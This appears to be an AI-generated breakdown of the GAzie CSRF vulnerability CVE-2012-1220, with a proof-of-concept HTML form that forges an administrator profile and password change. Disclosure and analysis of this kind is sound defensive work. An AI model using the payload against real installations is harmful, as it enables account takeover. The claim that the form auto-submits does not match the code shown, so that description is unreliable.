Based on the provided content, here's a breakdown of the vulnerability:

**CVE ID:** CVE-2012-1220

**Vulnerability:** Cross-Site Request Forgery (CSRF)

**Affected Software:** GAzie <= 5.20

**Root Cause:** The application lacks proper CSRF protection, allowing an attacker to forge requests on behalf of an authenticated user.

**Weaknesses:**
*   **Missing CSRF protection:** The application does not validate the origin of requests, enabling CSRF attacks.
*   **Predictable form:** The form used to update user data is not protected with a unique token, allowing an attacker to replicate the request.

**Impact of Exploitation:**
*   An attacker can modify user details including the password and language settings of the user without the knowledge of the user.
*  Account takeover is possible

**Attack Vectors:**
*   The attacker crafts a malicious HTML page with a form that submits a request to the vulnerable application.
*   The attacker tricks a logged-in user into visiting the malicious page. When the user loads the page, the malicious form is automatically submitted in the background.

**Required Attacker Capabilities/Position:**
*   The attacker needs to have knowledge of the vulnerable application's request format.
*   The attacker needs to be able to trick a logged-in user into visiting a malicious webpage.

**Exploit Code:**
```html
<form enctype="multipart/form-data"
action="[localhost]/modules/config/admin_utente.php?Login=amministratore&Update"
method="POST">
<input type="hidden" name="Login" value="amministratore">
<input type="hidden" value="" name="Update">
<input type="text" value="Surname " name="Cognome" title="Cognome">
<input type="text" value="Name " name="Nome" title="Nome">
<input type="text" value="italian" name="lang">
<input type="text" value="9" name="Abilit"><br/>
Password
<input type="password" value="" name="Password"><br/><!-- at least
eight alphanumeric characters -->
Repeat password
<input type="password" value="" name="confpass"><br/>
<input type="submit" value="START THE GAME" name="Submit">
</form>
```

The exploit code demonstrates how an attacker can forge a request to update a user's profile with arbitrary data, including password, by crafting a form that is automatically submitted when a logged in user visits the attackers webpage.
